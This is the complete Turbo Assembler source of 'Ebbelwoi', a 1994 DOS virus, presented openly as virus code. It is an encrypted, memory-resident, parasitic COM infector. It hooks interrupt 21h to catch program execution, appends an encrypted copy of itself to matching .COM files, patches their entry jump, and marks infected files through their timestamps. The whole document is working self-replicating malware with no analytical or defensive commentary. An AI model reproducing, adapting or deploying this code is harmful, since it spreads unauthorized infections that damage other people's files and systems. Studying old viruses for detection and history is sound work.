;+--------------------------------------------------------------------------+
;|  VIRUS NAME...:  Ebbelwoi Version qux   ( speak: 'abblvoy' )   B   . .   |
;|  TYPE.........:  Encrypted Resident Parasitic COM - Infector   E    |    |
;|  AUTHOR.......:  (;)Sirius , 19-JAN-94 , Germany               T   ---   |
;|  COMPILER.....:  Turbo Assembler 3.1                           A VERSION |
;+--------------------------------------------------------------------------+
; infection only on:    *1.COM files
; encryption key changes after every step
; get-resident-routine from Screamer

xx              equ   offset s1
v_len           equ   end_mark - start

CODE    SEGMENT
        ASSUME  CS:CODE,DS:CODE,ES:CODE,SS:CODE
        ORG     100h

sample: jmp     start

start:  call    s1

;s1:     mov     bp,ss:[si-4]                      ; an another trick to find
;        inc     sp                                ; thus damned location
;        inc     sp                                ; why does it fail ?

s1:     mov     di,sp
        mov     bp,ss:[di]
        inc     sp
        inc     sp

        lea     si,[bp+encrypted_code-xx]
        mov     dx,[bp+offset enc_val-xx]
        call    crypt
        jmp     short encrypted_code

enc_val dw      0000
        
CRYPT:  MOV     cx,(offset end_enc_code-offset encrypted_code)/2+1
n_loop: XOR     [si],dx
        or      dx,dx                  ; enc_val=0 ??
        jz      notty

        test    word ptr [si],1
        jz      radio
        inc     dx
radio:  inc     dx

notty:  INC     si
        INC     si
        LOOP    n_loop
        RET

encrypted_code:
        mov     ax,0affeh
        int     21h
        cmp     ax,01994h
        jz      already_resident

        XOR     AX,AX
        MOV     DS,AX
        sub     WORD PTR DS:[413H],2             ; decrement total conv. memory

        LDS     BX,DS:[4*21h]                    ; get int 21 handler
        mov     word ptr cs:[bp+OLD_BX-xx],BX
        mov     word ptr cs:[bp+OLD_ES-xx],DS

        mov     bx,cs                            ; Get address of our memory
        dec     bx                               ; block
        MOV     DS,BX                            ; decrease memory allocated
        SUB     WORD PTR ds:[0003h],150h         ; to this program
        sub     word ptr ds:[0012h],150h         ; decrease avail. memory

        mov     word ptr ax,ds:[0012h]           ; by paragraphs (=10 bytes)
;        push word ptr [0012h]
;        pop  es
        mov     es,ax                            ; es = our new segment

        push    cs
        pop     ds
        lea     si,[bp+start-xx]              ; copy virus to TOM
        MOV     DI,103H                       ; ES:103h is destination
        MOV     CX,v_len                      ; so the offsets in the interrupt
        REPZ    MOVSB                         ; are equal to offsets in this
                                           ; sample file
        mov     ds,cx                      ; cx=0
        CLI                                ; set our handler
        MOV     word ptr ds:[4*21h+2],AX
        MOV     WORD PTR ds:[4*21h],offset new_21
        STI

        push    cs
        pop     ds
        push    cs
        pop     es

already_resident:
        lea     si,[bp+orig_bytes-xx]        ;restore first 3bytes of prog
        mov     di,100h
        movsb
        movsw

        mov     ax,100h
        push    ax
        xor     ax,ax
        ret

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

NEW_21:
        pushf
        cmp     ax,4b00h
        jz      function_to_hang
        cmp     ax,0affeh
        jne     false_function
        mov     ax,01994h
        popf
        iret

false_function:
        popf
call_original_21:
        db      0EAh            ; FAR JUMP old_es:old_bx
old_bx  dw      0000h
old_es  dw      0000h

function_to_hang:
        push    ax         ; Function EXECUTE:
        push    bx         ; DS:DX = @ of filename
        push    cx
        push    dx
        push    si
        push    di
        push    ds
        push    es

        push    cs                      ; Move file-name to our buffer
        pop     es
        mov     di,offset name_buf
        mov     si,dx
        mov     cx,64                   ; a path can be up to 64 chars long
        rep     movsb

        push    cs
        pop     ds

;------------check if program executed is a .COM file-----------------------------------------


        mov     si,offset name_buf
orange: lodsb
        or      al,al
        jnz     orange
        cmp     [si-3],'MO'
        jz      apple
        jmp     break_infection

apple:  cmp     [si-6],'.1'
        jz      continue_com
        jmp     break_infection

continue_COM:
       mov      ax,4301h                  ; clear attributes
       mov      dx,offset name_buf
       xor      cx,cx
       int      21h

       mov      ax,3d02h                              ;open file
       mov      dx,offset name_buf
       int      21h
       jc       done
       xchg     ax,bx

       push     bx

       mov      ah,2fh                 ; copy DTA to buffer
       int      21h                    ; @ of DTA = es:bx
       push     es
       pop      ds
       push     cs
       pop      es
       mov      si,bx
       add      si,15h                ; only copy a part of DTA
       mov      di,offset dta
       mov      cx,5
       cld
       rep      movsb
       push     cs
       pop      ds

       pop      bx

       push     cs
       pop      es

       mov      ax,time
       and      al,00011111b
       cmp      al,00000011b         ;vegleichen auf sec.=6 (=3)
       jnz      infect

done:  mov      ah,3eh                           ;close file
       int      21h

break_infection:
       pop     es
       pop     ds
       pop     di
       pop     si
       pop     dx
       pop     cx
       pop     bx
       pop     ax
       jmp     false_function

infect:
       mov      ah,3fh                                ;erste 3 byt d. zuinfiz.prog
       mov      dx,offset orig_bytes                  ;sichern
       mov      cx,3
       int      21h

       cmp word ptr offset orig_bytes-3,"MZ"
       jz  done
       cmp word ptr offset orig_bytes-3,"ZM"
       jz  done
       cmp word ptr offset orig_bytes-3,0E957h          ; checks if L.COM
       jz  done

       mov      ax,4202h                               ;pointer to EOF
       xor      cx,cx
       cwd
       int      21h

       cmp      ax,3                    ; file length check
       jb       done
       cmp      ax,50000
       jnb      done

       sub      ax,3
       mov      word ptr addr_jmp_op+1,ax     ;jmp - argument
       mov      byte ptr addr_jmp_op,0E9h     ;jmp - operator

get_value:
       mov      ah,2ch                                 ;get clock time
       int      21h
       or       dx,dx                                   ; = 0 ?
       je       get_value
       mov      enc_val,dx

;copy virus to buffer
       mov      si,offset start
       mov      di,offset enc_buffer
       mov      cx,v_len
       cld
       rep      movsb

;encrypt virus copy ( header wont get encrypted )
       mov      si,offset enc_buffer
       add      si,offset encrypted_code - offset start
 
       mov      dx,enc_val
       call     crypt

       mov      ah,40h                                    ;copy encrypted virus
       mov      dx,offset enc_buffer
       mov      cx,v_len
       int      21h
                                              ;bei al=0 h;ngt es sich auf !?
       mov      ax,4202h                           ;bei al=2 ist schreiben ok !!
       mov      cx,-1                              ;pointer to TOF
       mov      dx,word ptr addr_jmp_op+1
       add      dx,v_len+3
       neg      dx
       int      21h

       mov      ah,40h                                    ;write new 3 bytes
       mov      cx,3
       mov      dx,offset addr_jmp_op
       int      21h

       mov      ax,5701h
       mov      dx,date
       mov      cx,time
       and      cl,11100000b
       or       cl,00000011b                     ;set 6 sec.!!!!!!!!
       int      21h
       jmp      done

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

orig_bytes    db  90h,0CDh,20h
end_enc_code  equ $
end_mark      equ $

addr_jmp_op   db  0,0,0
temp_time     dw  0
temp_date     dw  0

dta           equ $
attribs       db  0
time          dw  0
date          dw  0

name_buf      db  "1.COM",0     ; here a  64 bytes buffer for path+filename
enc_buffer    equ $

CODE    ENDS
        END     sample

